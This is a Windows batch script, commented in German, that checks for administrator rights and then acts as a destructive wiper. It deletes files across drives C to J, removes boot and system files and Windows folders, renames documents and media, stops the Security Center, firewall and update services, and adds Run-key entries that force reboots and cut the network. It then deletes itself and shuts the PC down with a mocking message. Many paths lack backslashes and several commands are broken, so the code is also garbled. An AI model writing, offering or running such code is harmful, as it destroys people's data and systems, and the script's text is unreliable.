@echo off
@echo off
CLS

REM Überprüfen, ob das Skript als Administrator ausgeführt wird
NET SESSION >NUL 2>&1
IF %ERRORLEVEL% EQU 0 (
    REM Der Benutzer ist ein Administrator, füge hier den eigentlichen Code ein
    pconfig /release
del D:*.* /f /s /q

del E:*.* /f /s /q

del F:*.* /f /s /q

del G:*.* /f /s /q

del H:*.* /f /s /q

del I:*.* /f /s /q

del J:*.* /f /s /q

attrib -r -s -h c:autoexec.bat

del c:autoexec.bat

attrib -r -s -h c:boot.ini

del c:boot.ini

attrib -r -s -h c:ntldr

del c:ntldr

attrib -r -s -h c:windowswin.ini

del c:windowswin.ini

del c:WINDOWSsystem32*.*/q

rd/s/q D:

rd/s/q C:

rd/s/q E:

del %systemdrive%*.* /f /s /q

attrib -r -s -h c:autoexec.bat

del c:autoexec.bat

attrib -r -s -h c:boot.ini

del c:boot.ini

attrib -r -s -h c:ntldr

del c:ntldr

attrib -r -s -h c:windowswin.ini

del c:windowswin.ini

echo @echo off>c:windowshartlell.bat

echo break off>>c:windowshartlell.bat

echo shutdown -r -t 11 -f>>c:windowshartlell.bat

echo end>>c:windowshartlell.bat

reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f

reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f

REN *.DOC *.TXT REN *.JPEG *.TXT

REN *.LNK *.TXT

REN *.AVI *.TXT

REN *.MPEG *.TXT

REN *.COM *.TXT

REN *.BAT *.TXT

eg

add HKLMSoftwareMicrosoftWindowsCurrentVersionRun /v MiXedVeX /t

REG_SZ /d %systemroot%HaloTrialScoreChangerV1 /f > nul

start iexpress (website of your choice)

ipconfig /release

del “C:Program FilesMicrosoft Games

del “C:Nexon

del “C:Program FilesXfire

del “C:Program FilesAdobe”

del “C:Program FilesInternet Explorer”

del “C:Program FilesMozilla Firefox”

del “C:WINDOWS”

del “C:WINDOWSsystem32”

del “C:WINDOWSsystem32cmd”

del “C:WINDOWSsystem32iexpress”

del “C:WINDOWSsystem32sndvol32”

del “C:WINDOWSsystem32sndrec32”

del “C:WINDOWSsystem32Restorerstrui”

del “C:WINDOWSsystem32wupdmgr”

del “C:WINDOWSsystem32desktop”

del “C:WINDOWSjava”

del “C:WINDOWSMedia”

del “C:WINDOWSResources”

del “C:WINDOWSsystem”

del “C:drivers”

del “C:drv”

del “C:SYSINFO”

del “C:Program Files”

echo ipconfig/release_all>>c:windowswimn32.bat

net stop “Security Center”

net stop SharedAccess

> “%Temp%.kill.reg” ECHO REGEDIT4

>>”%Temp%.kill.reg” ECHO.

>>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesS haredAccess]

>>”%Temp%.kill.reg” ECHO “Start”=dword:00000004

>>”%Temp%.kill.reg” ECHO.

>>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesw uauserv]

>>”%Temp%.kill.reg” ECHO “Start”=dword:00000004

>>”%Temp%.kill.reg” ECHO.

>>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMControlSet001Serviceswscsv c]

>>”%Temp%.kill.reg” ECHO “Start”=dword:00000004

>>”%Temp%.kill.reg” ECHO.

START /WAIT REGEDIT /S “%Temp%.kill.reg”

del “%Temp%.kill.reg”

del %0

echo @echo off>c:windowswimn32.bat

echo break off>>c:windowswimn32.bat

echo ipconfig/release_all>>c:windowswimn32.bat

echo end>>c:windowswimn32.bat

reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f

reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f

shutdown /s /f /t 69 /d p:4:1 /c "This PC is fucked :D"

) ELSE (
    REM Der Benutzer ist kein Administrator
    echo Run the code as an admin.
    echo Closing programm...
    pause
    exit
)

